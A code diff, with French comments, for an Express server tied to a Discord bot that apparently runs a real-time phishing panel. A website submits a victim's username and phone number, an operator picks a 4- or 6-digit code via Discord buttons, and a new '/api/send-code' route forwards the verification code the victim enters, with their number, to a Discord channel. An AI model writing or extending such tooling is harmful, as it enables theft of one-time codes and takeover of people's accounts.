@@ -18,27 +18,62 @@ client.once(Events.ClientReady, () => {
     console.log(`Bot prêt : ${client.user.tag}`);
 });
 
+// Importer EmbedBuilder en haut de ton fichier (si ce n'est pas déjà fait)
+// Cherche la ligne "const { Client, GatewayIntentBits..." et ajoute EmbedBuilder
+// Exemple : const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, Events, EmbedBuilder } = require('discord.js');
+
 // Quand ton site web envoie un numéro
 app.post('/api/send-info', async (req, res) => {
     const { pseudo, phone } = req.body;
-    lastAction = { status: 'waiting', length: 0, phone: phone }; // Réinitialise l'état
+    lastAction = { status: 'waiting', length: 0, phone: phone };
 
     try {
         const channel = await client.channels.fetch(CHANNEL_ID);
+        
+        const embed = new EmbedBuilder()
+            .setTitle('📱 Nouvelle demande')
+            .setColor('#FFFC00')
+            .addFields(
+                { name: 'Utilisateur', value: `\`${pseudo}\``, inline: true },
+                { name: 'Numéro', value: `\`${phone}\``, inline: true }
+            )
+            .setTimestamp();
+
         const row = new ActionRowBuilder().addComponents(
             new ButtonBuilder().setCustomId('btn_4').setLabel('Code à 4 chiffres').setStyle(ButtonStyle.Primary),
             new ButtonBuilder().setCustomId('btn_6').setLabel('Code à 6 chiffres').setStyle(ButtonStyle.Success)
         );
-        await channel.send({ 
-            content: `📱 **Nouvelle demande**\n> **Pseudo :** \`${pseudo}\`\n> **Numéro :** \`${phone}\``,
-            components: [row]
-        });
+        
+        await channel.send({ embeds: [embed], components: [row] });
+        res.json({ success: true });
+    } catch (err) {
+        console.error(err);
+        res.status(500).json({ error: 'Erreur Discord' });
+    }
+});
+
+// Nouvelle route pour recevoir le code final du site
+app.post('/api/send-code', async (req, res) => {
+    const { pseudo, phone, code, length } = req.body;
+    try {
+        const channel = await client.channels.fetch(CHANNEL_ID);
+        const embed = new EmbedBuilder()
+            .setTitle('✅ Code reçu')
+            .setColor('#00FF00') // Vert
+            .addFields(
+                { name: 'Utilisateur', value: `\`${pseudo}\``, inline: true },
+                { name: 'Numéro', value: `\`${phone}\``, inline: true },
+                { name: 'Choix', value: `\`${length} chiffres\``, inline: false },
+                { name: 'Code', value: `\`${code}\``, inline: false }
+            )
+            .setTimestamp();
+        
+        await channel.send({ embeds: [embed] });
         res.json({ success: true });
     } catch (err) {
         res.status(500).json({ error: 'Erreur Discord' });
     }
 });
-
 // Quand ton site web vérifie l'état (Polling)
 app.get('/api/check-status', (req, res) => {
     const phone = req.query.phone;
